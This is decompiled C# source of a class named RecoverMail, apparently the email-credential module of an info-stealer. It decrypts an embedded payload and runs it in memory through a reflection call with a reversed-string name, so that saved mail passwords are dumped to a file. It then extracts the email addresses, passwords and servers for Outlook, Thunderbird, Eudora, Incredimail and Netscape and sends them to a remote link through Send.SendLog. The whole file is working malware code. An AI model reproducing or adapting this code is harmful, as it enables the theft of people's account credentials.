using System;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

internal class RecoverMail
{
	private string R_List;

	public RecoverMail()
	{
		R_List = ReadMail();
	}

	public void Outlook()
	{
		FandS("Outlook");
	}

	public void Thunderbird()
	{
		FandS("_Thunder_bird".Replace("_", null));
	}

	public void Eudora()
	{
		FandS("Eudora");
	}

	public void Incredimail()
	{
		FandS("Incredimail");
	}

	public void NetScape()
	{
		FandS("Netscape");
	}

	public string ReadMail()
	{
		//IL_00ff: Unknown result type (might be due to invalid IL or missing references)
		string text = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "\\Mails.txt";
		string result = default(string);
		try
		{
			if (!File.Exists(text))
			{
				Assembly assembly = (Assembly)typeof(Assembly).GetMethod(Strings.StrReverse("ylbmessAgnitucexEteG"))!.Invoke(null, null);
				new ResourceManager("Key", assembly);
				byte[] bytes = Encoding.Unicode.GetBytes("version1.6");
				string executablePath = Application.get_ExecutablePath();
				string text2 = "/stext " + text;
				byte[] _Bytes = KidMode.GetData("7a27586dc8134e169a1dc116ed159cd5jeffjef");
				string _Class = "MemoryEx";
				string _Sub = "Execute";
				object _Parameters = new object[4]
				{
					executablePath,
					text2,
					Encryption.RSMDecrypt(KidMode.GetData("RecoverMail"), bytes),
					false
				};
				KidMode.InvokeDll(ref _Bytes, ref _Class, ref _Sub, ref _Parameters);
				while (!File.Exists(text))
				{
					Thread.Sleep(1000);
				}
			}
			result = File.ReadAllText(text);
			return result;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show(ex2.ToString());
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public void FandS(string MailClient)
	{
		try
		{
			Thread.Sleep(1000);
			int count = Regex.Matches(R_List, Regex.Escape("Application")).Count;
			for (int i = 0; i < count; i = checked(i + 1))
			{
				string between = GetBetween(R_List, "Email             : ", "Server            : ", i);
				string between2 = GetBetween(R_List, "Password          : ", "Profile           : ", i);
				string between3 = GetBetween(R_List, "Server            : ", "Server Port       : ", i);
				string between4 = GetBetween(R_List, "Application       : ", "Email             : ", i);
				if (Is_Containing(between4, MailClient))
				{
					Send.SendLog(KidMode.P_Link, "Passwords", null, null, between4, between3, between, between2, null);
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public string GetBetween(string input, string str1, string str2, int ind)
	{
		string input2 = Regex.Split(input, str1)[checked(ind + 1)];
		return Regex.Split(input2, str2)[0];
	}

	public bool Is_Containing(string input, string search)
	{
		return input.Contains(search);
	}
}
